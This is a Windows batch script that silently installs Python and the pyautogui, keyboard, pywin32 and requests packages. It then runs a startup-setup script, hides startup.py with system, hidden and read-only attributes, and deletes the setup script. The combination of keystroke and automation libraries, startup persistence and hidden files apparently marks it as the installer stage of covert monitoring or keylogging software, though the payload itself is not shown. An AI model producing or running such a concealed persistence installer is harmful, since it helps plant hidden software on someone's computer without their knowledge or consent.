@echo off


set PYTHON_INSTALL_PATH=C:\Python39





echo Installing Python...
start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1 TargetDir=%PYTHON_INSTALL_PATH%

echo Cleaning up...
del python-installer.exe

echo Python installation completed.


pip install beautifulsoup4
pip install requests
pip install pyautogui
pip install keyboard
pip install pywin32


python set_startup.py

attrib +s +h +r "startup.py"
del set_startup.py
